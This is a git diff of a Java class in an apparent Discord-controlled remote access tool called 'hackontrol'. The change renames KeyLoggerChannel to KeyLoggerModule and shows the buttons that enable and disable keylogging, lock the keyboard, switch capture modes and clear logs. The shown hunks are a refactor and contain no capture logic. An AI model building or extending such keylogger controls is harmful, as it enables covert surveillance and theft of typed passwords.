@@ -1,8 +1,7 @@
-package com.khopan.hackontrol.channel.keylogger;
+package com.khopan.hackontrol.module.keylogger;
 
 import java.util.List;
 
-import com.khopan.hackontrol.HackontrolChannel;
 import com.khopan.hackontrol.NativeLibrary;
 import com.khopan.hackontrol.manager.interaction.ButtonContext;
 import com.khopan.hackontrol.manager.interaction.ButtonManager;
@@ -10,6 +9,7 @@ import com.khopan.hackontrol.manager.interaction.ButtonManager.ButtonType;
 import com.khopan.hackontrol.manager.interaction.InteractionManager;
 import com.khopan.hackontrol.manager.interaction.Question;
 import com.khopan.hackontrol.manager.interaction.Question.QuestionType;
+import com.khopan.hackontrol.module.Module;
 import com.khopan.hackontrol.registry.Registry;
 import com.khopan.hackontrol.utils.HackontrolMessage;
 
@@ -19,8 +19,8 @@ import net.dv8tion.jda.api.entities.channel.middleman.MessageChannel;
 import net.dv8tion.jda.api.interactions.components.ActionRow;
 import net.dv8tion.jda.api.interactions.components.buttons.Button;
 
-public class KeyLoggerChannel extends HackontrolChannel {
-	private static final String CHANNEL_NAME = "keylogger";
+public class KeyLoggerModule extends Module {
+	private static final String MODULE_NAME = "keylogger";
 
 	static boolean RawKeyMode;
 
@@ -37,23 +37,23 @@ public class KeyLoggerChannel extends HackontrolChannel {
 
 	@Override
 	public String getName() {
-		return KeyLoggerChannel.CHANNEL_NAME;
+		return KeyLoggerModule.MODULE_NAME;
 	}
 
 	@Override
 	public void preInitialize(Registry registry) {
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_DISABLE,         context -> this.buttonEnable(context, false));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_LOCK_KEYBOARD,   context -> this.buttonLock(context, true));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_RAW_KEY_MODE,    context -> this.buttonRawKeyMode(context, true));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_TEXT_MODE,       context -> this.buttonRawKeyMode(context, false));
-		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerChannel.BUTTON_CLEAR,           this :: buttonClear);
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_ENABLE,          context -> this.buttonEnable(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_DISABLE,         context -> this.buttonEnable(context, false));
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_LOCK_KEYBOARD,   context -> this.buttonLock(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_UNLOCK_KEYBOARD, context -> this.buttonLock(context, false));
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_RAW_KEY_MODE,    context -> this.buttonRawKeyMode(context, true));
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_TEXT_MODE,       context -> this.buttonRawKeyMode(context, false));
+		registry.register(InteractionManager.BUTTON_REGISTRY, KeyLoggerModule.BUTTON_CLEAR,           this :: buttonClear);
 	}
 
 	@Override
 	public void initialize() {
-		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerChannel.BUTTON_ENABLE, KeyLoggerChannel.BUTTON_DISABLE), ActionRow.of(KeyLoggerChannel.BUTTON_LOCK_KEYBOARD, KeyLoggerChannel.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerChannel.BUTTON_RAW_KEY_MODE, KeyLoggerChannel.BUTTON_TEXT_MODE, KeyLoggerChannel.BUTTON_CLEAR)).queue();
+		this.channel.sendMessageComponents(ActionRow.of(KeyLoggerModule.BUTTON_ENABLE, KeyLoggerModule.BUTTON_DISABLE), ActionRow.of(KeyLoggerModule.BUTTON_LOCK_KEYBOARD, KeyLoggerModule.BUTTON_UNLOCK_KEYBOARD), ActionRow.of(KeyLoggerModule.BUTTON_RAW_KEY_MODE, KeyLoggerModule.BUTTON_TEXT_MODE, KeyLoggerModule.BUTTON_CLEAR)).queue();
 	}
 
 	@Override
@@ -92,12 +92,12 @@ public class KeyLoggerChannel extends HackontrolChannel {
 	}
 
 	private void buttonRawKeyMode(ButtonContext context, boolean rawKeyMode) {
-		if(KeyLoggerChannel.RawKeyMode == rawKeyMode) {
+		if(KeyLoggerModule.RawKeyMode == rawKeyMode) {
 			HackontrolMessage.boldDeletable(context.reply(), (rawKeyMode ? "Raw key" : "Text") + " mode is already enabled");
 			return;
 		}
 
-		KeyLoggerChannel.RawKeyMode = rawKeyMode;
+		KeyLoggerModule.RawKeyMode = rawKeyMode;
 		context.deferEdit().queue();
 	}
 
